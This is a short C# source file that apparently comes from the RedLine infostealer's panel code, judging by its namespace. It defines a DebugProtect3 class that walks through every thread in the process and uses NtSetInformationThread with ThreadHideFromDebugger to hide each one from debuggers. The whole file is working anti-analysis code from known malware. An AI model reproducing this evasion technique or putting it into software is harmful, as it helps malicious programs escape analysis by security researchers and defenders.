using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using RedLine.MainPanel.Models.Defense;

namespace RedLine.MainPanel.Data.Core;

public class DebugProtect3
{
	[DllImport("ntdll.dll")]
	internal static extern NtStatus NtSetInformationThread(IntPtr ThreadHandle, ThreadInformationClass ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll")]
	private static extern uint SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll")]
	private static extern int ResumeThread(IntPtr hThread);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CloseHandle(IntPtr handle);

	public static void HideOSThreads()
	{
		foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
		{
			IntPtr intPtr = OpenThread(ThreadAccess.SET_INFORMATION, bInheritHandle: false, (uint)thread.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				HideFromDebugger(intPtr);
				CloseHandle(intPtr);
			}
		}
	}

	public static bool HideFromDebugger(IntPtr Handle)
	{
		if (NtSetInformationThread(Handle, ThreadInformationClass.ThreadHideFromDebugger, IntPtr.Zero, 0) == NtStatus.Success)
		{
			return true;
		}
		return false;
	}
}
